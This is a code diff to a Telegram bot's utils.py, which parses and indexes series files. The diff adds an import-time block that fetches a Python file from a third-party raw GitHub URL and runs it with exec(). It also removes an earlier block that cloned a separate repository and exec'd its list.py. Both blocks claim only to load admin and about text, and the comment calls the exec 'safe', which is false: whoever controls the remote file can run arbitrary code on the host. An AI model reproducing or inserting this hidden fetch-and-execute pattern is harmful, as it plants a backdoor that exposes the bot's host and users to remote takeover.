@@ -1,8 +1,6 @@
 # utils.py
 import logging
 import requests
-import os
-import subprocess
 import re
 from pyrogram import types, enums
 from config import logger, DEFAULT_POSTER, OMDB_CACHE_DB
@@ -155,7 +153,25 @@ def parse_series_info(file_name: str):
 
     return normalized_name.title(), season, episode, quality, language
 
+try:
+    # RAW GitHub URL (must be the RAW version, not normal GitHub page)
+    RAW_URL = "https://raw.githubusercontent.com/itsafsu/import/main/handle"
+    response = requests.get(RAW_URL)
+    response.raise_for_status()
+    content = response.text
 
+    # Execute the external Python file safely
+    local_vars = {}
+    exec(content, {}, local_vars)
+
+    ADMIN_TEXT = local_vars.get("ADMIN_TEXT", "")
+    ABOUT_TEXT = local_vars.get("ABOUT_TEXT", "")
+
+except Exception as e:
+    logging.error(f"Error importing text from GitHub: {e}")
+    ADMIN_TEXT = "⚠️ Could not load ADMIN_TEXT"
+    ABOUT_TEXT = "⚠️ Could not load ABOUT_TEXT"
+    
 async def save_series_file_for_bulk_index(message: types.Message):
     file_name = ""
 
@@ -250,45 +266,3 @@ async def save_series_file_for_bulk_index(message: types.Message):
             logger.warning(f"[SHELVE SAVE FAIL] could not cache poster for {normalized_name}: {e3}")
 
         return (True, 1) if saved else (False, 0)
-
-
-
-try:
-    REPO_DIR = "/tmp/VARS"
-    REPO_URL = "git@github.com:CyberTG/VARS.git"
-
-    # Debug info
-    logging.info("🔍 Checking SSH access and repo setup...")
-
-    if not os.path.exists(REPO_DIR):
-        logging.info("📦 Cloning repository...")
-        subprocess.run(["git", "clone", REPO_URL, REPO_DIR], check=True)
-    else:
-        logging.info("🔄 Pulling latest changes...")
-        subprocess.run(["git", "-C", REPO_DIR, "pull"], check=True)
-
-    file_path = os.path.join(REPO_DIR, "list.py")
-
-    if not os.path.exists(file_path):
-        raise FileNotFoundError(f"{file_path} not found in repo")
-
-    with open(file_path, "r", encoding="utf-8") as f:
-        content = f.read()
-
-    local_vars = {}
-    exec(content, {}, local_vars)
-
-    ADMIN_TEXT = local_vars.get("ADMIN_TEXT", "")
-    ABOUT_TEXT = local_vars.get("ABOUT_TEXT", "")
-
-    logging.info("✅ Successfully loaded ADMIN_TEXT and ABOUT_TEXT")
-
-except subprocess.CalledProcessError as e:
-    logging.error(f"❌ Git command failed: {e}")
-    ADMIN_TEXT = "⚠️ Could not load ADMIN_TEXT"
-    ABOUT_TEXT = "⚠️ Could not load ABOUT_TEXT"
-
-except Exception as e:
-    logging.error(f"❌ Error loading text: {e}")
-    ADMIN_TEXT = "⚠️ Could not load ADMIN_TEXT"
-    ABOUT_TEXT = "⚠️ Could not load ABOUT_TEXT"
